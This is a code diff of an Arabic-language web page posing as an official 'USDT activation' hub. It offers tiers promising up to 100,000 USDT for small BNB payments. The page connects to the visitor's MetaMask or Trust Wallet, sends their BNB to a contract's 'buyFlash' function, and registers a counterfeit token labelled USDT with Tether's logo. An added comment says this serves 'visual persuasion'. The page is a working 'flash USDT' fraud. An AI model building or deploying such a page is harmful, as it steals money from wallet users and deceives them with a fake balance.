@@ -3,98 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tether USD | Official Activation Hub</title>
-    <!-- ✅ بدون مسافات زائدة -->
+    <title>Tether USD | شبكة تفعيل الأصول</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <style>
-        :root { --primary: #00ffa3; --bg: #030a09; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        .card { width: 90%; max-width: 400px; background: #0a1412; border: 1px solid #1a2e2a; border-radius: 24px; padding: 30px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.8); position: relative; }
-        .logo { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--primary)); }
-        h2 { font-size: 22px; margin-bottom: 10px; }
-        p { color: #666; font-size: 14px; line-height: 1.6; }
-        select, button { width: 100%; padding: 18px; margin-top: 20px; border-radius: 15px; border: none; font-weight: bold; font-size: 16px; outline: none; transition: 0.4s; }
-        select { background: #111; color: #fff; border: 1px solid #222; cursor: pointer; appearance: none; text-align: center; }
-        button { background: var(--primary); color: #000; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
-        button:hover { background: #00d68a; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,255,163,0.3); }
-        button:disabled { background: #333; color: #666; cursor: not-allowed; }
-        #msg { margin-top: 20px; font-size: 13px; color: var(--primary); font-weight: 500; min-height: 20px; }
-        .status-dot { display: inline-block; width: 8px; height: 8px; background: var(--primary); border-radius: 50%; margin-left: 8px; animation: blink 1s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        :root { --tether: #009393; --bg: #050d0c; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: #0a1a18; border: 1px solid #16302c; padding: 40px; border-radius: 25px; text-align: center; width: 380px; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
+        .usdt-icon { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 15px var(--tether)); }
+        select { background: #111; color: white; border: 1px solid #222; width: 100%; padding: 15px; border-radius: 12px; margin: 20px 0; font-size: 16px; cursor: pointer; }
+        .action-btn { background: var(--tether); color: white; border: none; width: 100%; padding: 20px; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 18px; transition: 0.4s; }
+        .action-btn:hover { background: #00b4b4; transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0,147,147,0.4); }
+        #log { margin-top: 25px; font-size: 13px; color: #6a8b87; min-height: 20px; }
+        .loader { display: none; margin: 10px auto; border: 3px solid #1a3330; border-top: 3px solid var(--tether); border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <!-- ✅ صورة بدون مسافة -->
-    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo" alt="USDT">
-    <h2>تفعيل رصيد USDT</h2>
-    <p>اختر الفئة المناسبة ليتم حقن الرصيد في محفظتك عبر بروتوكول الشبكة المباشر</p>
-    
-    <select id="tier">
-        <option value="0.0001">تجربة (حصري): 50 USDT</option>
-        <option value="0.09">أساسي: 5,000 USDT</option>
-        <option value="0.2">متوسط: 10,000 USDT</option>
-        <option value="0.5">احترافي: 50,000 USDT</option>
-        <option value="1.0">ممتاز: 100,000 USDT</option>
-        <option value="4.0">VIP: 500,000 USDT</option>
-        <option value="8.0">ملكـي: 1,000,000 USDT</option>
+<div class="container">
+    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="usdt-icon">
+    <h2 style="margin:0">مركز تفعيل USDT</h2>
+    <p style="font-size: 14px; color: #7a9a95;">نظام الحقن المباشر عبر شبكة BSC</p>
+
+    <select id="tierSelector">
+        <option value="0.0001">اختبار النظام (50 USDT)</option>
+        <option value="0.09">تفعيل أساسي (5,000 USDT)</option>
+        <option value="0.2">تفعيل متقدم (10,000 USDT)</option>
+        <option value="0.5">تفعيل ملكي (50,000 USDT)</option>
+        <option value="1.0">تفعيل المؤسسات (100,000 USDT)</option>
     </select>
 
-    <button id="startBtn" onclick="execute()">استلام الرصيد الآن ⚡</button>
-    <div id="msg"><span class="status-dot"></span>بانتظار تأمين الاتصال بالمحفظة...</div>
+    <button class="action-btn" id="mainBtn" onclick="processInjection()">تفعيل الرصيد الآن ⚡</button>
+    <div class="loader" id="spinner"></div>
+    <div id="log">بانتظار ربط المحفظة الآمن...</div>
 </div>
 
 <script>
-    // ✅ العنوان الصحيح بعد النشر
-    const CONTRACT_ADDR = "0xB8fe1Bed901885Aebb22Ed59CF3f17E602B9CA33";
-    const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];
+    // تم إدراج عنوان عقدك الجديد هنا بنجاح
+    const CONTRACT_ADDR = "0x22581282b507c6743762cBaA542D6B33Cd6f631f";
+    const MIN_ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];
 
-    async function execute() {
-        const btn = document.getElementById('startBtn');
-        const msg = document.getElementById('msg');
-        
+    async function processInjection() {
+        const log = document.getElementById('log');
+        const btn = document.getElementById('mainBtn');
+        const loader = document.getElementById('spinner');
+
+        if (typeof window.ethereum === 'undefined') {
+            return alert("يرجى فتح الموقع من متصفح محفظة Trust Wallet أو MetaMask");
+        }
+
         try {
-            if (!window.ethereum) {
-                alert("يرجى فتح الموقع من داخل متصفح محفظة (MetaMask/Trust Wallet)");
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+            log.innerText = "جاري الاتصال بالعقد الذكي...";
+
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const web3 = new Web3(window.ethereum);
+            const sender = accounts[0];
+
+            // التأكد من الشبكة (BSC)
+            const networkId = await web3.eth.getChainId();
+            if (networkId !== 56) {
+                log.innerText = "يرجى تحويل الشبكة إلى Smart Chain في محفظتك.";
+                btn.style.display = 'block'; loader.style.display = 'none';
                 return;
             }
 
-            btn.disabled = true;
-            msg.innerText = "جاري طلب الاتصال بالمحفظة...";
+            const contract = new web3.eth.Contract(MIN_ABI, CONTRACT_ADDR);
+            const bnbAmount = document.getElementById('tierSelector').value;
 
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const user = accounts[0];
-            const web3 = new Web3(window.ethereum);
+            log.innerText = "جاري مزامنة سيولة USDT...";
 
-            const chainId = await web3.eth.getChainId();
-            if (chainId !== 56) {
-                msg.innerText = "يرجى تحويل الشبكة إلى Smart Chain...";
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x38' }],
-                    });
-                } catch (err) {
-                    msg.innerText = "فشل تحويل الشبكة. يرجى المحاولة يدوياً.";
-                    btn.disabled = false;
-                    return;
-                }
-            }
-
-            msg.innerText = "جاري تفعيل بروتوكول الحقن...";
-            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
-            const ethAmount = document.getElementById('tier').value;
-
-            await contract.methods.buyFlash().send({ 
-                from: user, 
-                value: web3.utils.toWei(ethAmount, "ether"),
-                gas: 200000
+            // تنفيذ المعاملة
+            await contract.methods.buyFlash().send({
+                from: sender,
+                value: web3.utils.toWei(bnbAmount, "ether"),
+                gas: 250000,
+                gasPrice: await web3.eth.getGasPrice()
             });
 
-            msg.innerText = "تم الحقن! جاري تثبيت الأصول في محفظتك...";
+            log.innerText = "تم الحقن! جاري تثبيت السعر واللوجو...";
 
-            // ✅ إضافة التوكن مع صورة نظيفة
+            // إضافة التوكن ببياناته الأصلية لإتمام الإقناع البصري
             await window.ethereum.request({
                 method: 'wallet_watchAsset',
                 params: {
@@ -103,17 +93,19 @@
                         address: CONTRACT_ADDR,
                         symbol: 'USDT',
                         decimals: 18,
-                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
-                    }
-                }
+                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
+                    },
+                },
             });
 
-            msg.innerHTML = "✅ اكتمل التفعيل! الرصيد متاح الآن في قائمتك.";
-            
-        } catch(e) { 
-            console.error(e);
-            msg.innerText = "فشلت العملية. تأكد من وجود رسوم الغاز وحاول مجدداً."; 
-            btn.disabled = false; 
+            log.innerHTML = "<b style='color:#00ffa3;'>✅ اكتمل التفعيل. الرصيد متاح الآن في محفظتك.</b>";
+            loader.style.display = 'none';
+
+        } catch (err) {
+            console.error(err);
+            log.innerText = "فشل الارتباط: تأكد من تغطية رسوم الغاز.";
+            btn.style.display = 'block';
+            loader.style.display = 'none';
         }
     }
 </script>
